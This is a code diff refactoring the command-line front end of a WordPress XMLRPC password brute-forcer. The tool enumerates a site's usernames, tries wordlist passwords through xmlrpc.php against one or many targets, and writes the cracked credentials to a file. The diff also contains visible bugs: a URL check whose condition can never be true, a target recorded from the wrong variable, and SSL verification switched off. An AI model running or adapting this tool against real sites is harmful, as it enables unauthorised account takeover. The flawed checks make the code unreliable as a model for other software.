@@ -8,9 +8,119 @@ use Symfony\Component\Console\Input\InputOption;
 use Symfony\Component\Console\Input\InputInterface;
 use Symfony\Component\Console\Output\OutputInterface;
 use Arall\WPBruteforcer\WPBruteforcer;
+use DateTime;
+use \Curl\Curl;
 
 class Main extends Command
 {
+    /**
+     * Input Interface.
+     *
+     * var InputInterface
+     */
+    private $input;
+
+    /**
+     * Output Interface.
+     *
+     * @var OutputInterface
+     */
+    private $output;
+
+    /**
+     * Target URL (single).
+     *
+     * @var string
+     */
+    private $url;
+
+    /**
+     * Target URL's (multi).
+     *
+     * @var array
+     */
+    private $urls;
+
+    /**
+     * Wordlist path.
+     *
+     * @var string
+     */
+    private $wordlist;
+
+    /**
+     * Username to bruteforce (single).
+     *
+     * @var string
+     */
+    private $username;
+
+    /**
+     * Usernames to bruteforce (loaded ones).
+     *
+     * @var array
+     */
+    private $users;
+
+    /**
+     * Do not enumerate usernames.
+     *
+     * @var bool
+     */
+    private $noenum = false;
+
+    /**
+     * Do not test XMLRPC.
+     *
+     * @var bool
+     */
+    private $notest = false;
+
+    /**
+     * Max tries per request.
+     *
+     * @var int
+     */
+    private $tries = 100;
+
+    /**
+     * Max usernames to enumerate.
+     *
+     * @var int
+     */
+    private $max_enum;
+
+    /**
+     * XMLRPC URI.
+     *
+     * @var string
+     */
+    private $uri = '/xmlrpc.php';
+
+    /**
+     * Output log path.
+     *
+     * @var string
+     */
+    private $output_path;
+
+    /**
+     * Output log data.
+     *
+     * @var string
+     */
+    private $output_data;
+
+    /**
+     * Bruteforcer instance.
+     *
+     * @var WPBruteforcer
+     */
+    private $bruteforcer;
+
+    /**
+     * Command configuration.
+     */
     public function configure()
     {
         $this
@@ -79,112 +189,243 @@ class Main extends Command
         ;
     }
 
+    /**
+     * Command execution.
+     *
+     * @param InputInterface  $input
+     * @param OutputInterface $output
+     */
     public function execute(InputInterface $input, OutputInterface $output)
     {
-        $url = $input->getOption('url');
-        $urls = $input->getOption('urls');
-        $wordlist = $input->getOption('wordlist');
-        $tries = $input->getOption('tries');
-        $username = $input->getOption('username');
-        $noenum = $input->getOption('no-enum');
-        $notest = $input->getOption('no-test');
-        $max_enum = $input->getOption('max-enum');
-        $uri = $input->getOption('uri');
-        $output_path = $input->getOption('output');
-        $output_data = '';
+        // Set Input / Output interfaces
+        $this->input = $input;
+        $this->output = $output;
 
-        $bruteforcer = new WPBruteforcer();
+        // Load arguments and options
+        $this->loadInput();
 
-        // Wordlist
-        if (!file_exists($wordlist)) {
-            $output->writeln('<error> [!] Wordlist file not found. Exiting...</error>');
+        $this->bruteforcer = new WPBruteforcer();
 
-            return;
+        $time = new DateTime('now');
+
+        if (!$this->checkUrl()) {
+            return false;
         }
-        $bruteforcer->setWordlist($wordlist);
 
-        // Targets
-        if ($url) {
-            $urls = [$url];
-        } elseif ($urls) {
-            // Check wordlist
-            if (!file_exists($urls)) {
-                $output->writeln('<error> [!] URLs file not found. Exiting...</error>');
-
-                return;
-            }
-            $urls = file($urls);
+        if (!$this->loadWordlist()) {
+            return false;
         }
-        if (empty($urls)) {
-            $output->writeln('<error> [!] No targets found. Exiting...</error>');
 
-            return;
+        if (!$this->loadTargets()) {
+            return false;
         }
 
         // Tries
-        if ($tries) {
-            $bruteforcer->setTries($tries);
+        if ($this->tries) {
+            $this->bruteforcer->setTries($this->tries);
         }
 
         // URI
-        if ($uri) {
-            $bruteforcer->setXmlrpcUri($uri);
+        if ($this->uri) {
+            $this->bruteforcer->setXmlrpcUri($this->uri);
         }
 
-        foreach ($urls as $url) {
+        foreach ($this->urls as $url) {
             $url = trim($url);
 
-            $bruteforcer->setUrl($url);
+            $this->bruteforcer->setUrl($url);
 
             // Output current target
-            $output->writeln('');
-            $output->writeln(' [+] Target: <comment>' . $url . '</comment>');
+            $this->output->writeln(' [+] Target: <comment>' . $url . '</comment>');
 
-            // Test XMLRPC
-            if (!$notest) {
-                $output->writeln(' [+] Testing XMLRPC...');
-                if (!$bruteforcer->testXMLRPC()) {
-                    $output->writeln('<error> [!] XMLRPC is not responding properly. Exiting...</error>');
-
-                    continue;
-                }
-                $output->writeln('<info> [+] XMLRPC up and running!</info>');
+            if (!$this->checkXmlrpc()) {
+                continue;
             }
 
-            // Usernames
-            $users = [];
-            if (!$noenum) {
-                $output->writeln(' [+] Enumerating users...');
-                $users = $bruteforcer->enumerate($max_enum);
-                $output->writeln(' [+] <comment>' . count($users) . '</comment> user(s) found');
-            }
-            if ($username) {
-                $users[] = $username;
-            }
-            $users = array_unique($users);
-            if (empty($users)) {
-                $output->writeln('<error> [!] No users to bruteforce. Exiting...</error>');
-
+            if (!$this->loadUsernames()) {
                 continue;
             }
 
             // Bruteforce
-            foreach ($users as $user) {
-                $bruteforcer->setUsername($user);
-                $output->writeln(' [+] Bruteforcing user <comment>' . $user . '</comment>');
-                if ($password = $bruteforcer->bruteforce()) {
-                    $output->writeln('<info> [!] Password found!</info> <comment>' . $password . '</comment>');
-                    $output_data .= $url . ' | ' . $user . ' | ' . $password . PHP_EOL;
-                } else {
-                    $output->writeln('<error> [!] Password not found</error>');
-                }
-            }
+            $this->bruteforce();
         }
 
-        if ($output_path) {
-            file_put_contents($output_path, $output_data);
-            $output->writeln('');
-            $output->writeln(' [+] Credentials saved in <comment>' . $output_path . '</comment>');
+        $this->saveOutput();
+
+        $this->output->writeln(' [i] Elapsed time: ' . $time->diff(new DateTime('now'))->format('%H:%I:%S'));
+    }
+
+    /**
+     * Load all the user input (arguments and options).
+     */
+    private function loadInput()
+    {
+        $this->url = $this->input->getOption('url');
+        $this->urls = $this->input->getOption('urls');
+        $this->wordlist = $this->input->getOption('wordlist');
+        $this->tries = $this->input->getOption('tries');
+        $this->username = $this->input->getOption('username');
+        $this->noenum = $this->input->getOption('no-enum');
+        $this->notest = $this->input->getOption('no-test');
+        $this->max_enum = $this->input->getOption('max-enum');
+        $this->uri = $this->input->getOption('uri');
+        $this->output_path = $this->input->getOption('output');
+        $this->output_data = '';
+    }
+
+    /**
+     * Check if the provided URL is up and if it has a redirect.
+     */
+    private function checkUrl()
+    {
+        $curl = new Curl();
+        $curl->setOpt(CURLOPT_SSL_VERIFYPEER, false);
+        $curl->setOpt(CURLOPT_FOLLOWLOCATION, true);
+        $curl->get($this->url);
+
+        if ($curl->error && $curl->errorCode < 300 && $curl->errorCode >= 400) {
+            $this->output->writeln('<error> [!] Website HTTP error: ' . $curl->errorCode . '</error>');
+
+            return false;
         }
+
+        return true;
+    }
+
+    /**
+     * Load a wordlist.
+     *
+     * @return bool
+     */
+    private function loadWordlist()
+    {
+        // Wordlist
+        if (!file_exists($this->wordlist)) {
+            $this->output->writeln('<error> [!] Wordlist file not found. Exiting...</error>');
+
+            return false;
+        }
+        $this->bruteforcer->setWordlist($this->wordlist);
+
+        return true;
+    }
+
+    /**
+     * Load the target (single) or the provided file list.
+     *
+     * @return bool
+     */
+    private function loadTargets()
+    {
+        // Targets
+        if ($this->url) {
+            $this->urls = [$this->url];
+        } elseif ($this->urls) {
+            // Check wordlist
+            if (!file_exists($this->urls)) {
+                $this->output->writeln('<error> [!] URLs file not found. Exiting...</error>');
+
+                return false;
+            }
+            $this->urls = file($this->urls);
+        }
+        if (empty($this->urls)) {
+            $this->output->writeln('<error> [!] No targets found. Exiting...</error>');
+
+            return false;
+        }
+
+        return true;
+    }
+
+    /**
+     * Check if the website has the XMLRPC up and running.
+     *
+     * @return bool
+     */
+    private function checkXmlrpc()
+    {
+        if (!$this->notest) {
+            $this->output->writeln(' [+] Testing XMLRPC...');
+            if (!$this->bruteforcer->testXMLRPC()) {
+                $this->output->writeln('<error> [!] XMLRPC is not responding properly.</error>');
+
+                return false;
+            }
+            $this->output->writeln(' [i] XMLRPC up and running!');
+        }
+
+        return true;
+    }
+
+    /**
+     * Load the usernames using enumeration or / and the provided username.
+     *
+     * @return bool
+     */
+    private function loadUsernames()
+    {
+        $this->users = [];
+
+        // Enumerate
+        if (!$this->noenum) {
+            $this->output->writeln(' [+] Enumerating users...');
+            $this->users = $this->bruteforcer->enumerate($this->max_enum);
+            $this->output->writeln(' [i] <comment>' . count($this->users) . '</comment> user(s) found');
+        }
+
+        // Single
+        if ($this->username) {
+            $this->users[] = $this->username;
+        }
+
+        // Delete duplicated ones
+        $this->users = array_unique($this->users);
+
+        // Check
+        if (empty($this->users)) {
+            $this->output->writeln('<error> [!] No users to bruteforce.</error>');
+
+            return false;
+        }
+
+        return true;
+    }
+
+    /**
+     * Bruteforce the current loaded website's usernames.
+     * Output the obtained credentials.
+     * Saves the credentials into the output data.
+     */
+    private function bruteforce()
+    {
+        foreach ($this->users as $user) {
+            $this->bruteforcer->setUsername($user);
+            $this->output->writeln(' [+] Bruteforcing user <comment>' . $user . '</comment>');
+            if ($password = $this->bruteforcer->bruteforce()) {
+                $this->output->writeln('<info> [!] Password found!</info> <comment>' . $password . '</comment>');
+                // Save data for a possible output
+                $this->output_data .= $this->url . ' | ' . $user . ' | ' . $password . PHP_EOL;
+            }
+        }
+        $this->output->writeln('');
+    }
+
+    /**
+     * Save the output data into a file.
+     *
+     * @return bool
+     */
+    private function saveOutput()
+    {
+        if ($this->output_path) {
+            file_put_contents($this->output_path, $this->output_data);
+            $this->output->writeln(' [+] Credentials saved in <comment>' . $this->output_path . '</comment>');
+            $this->output->writeln('');
+
+            return true;
+        }
+
+        return false;
     }
 }
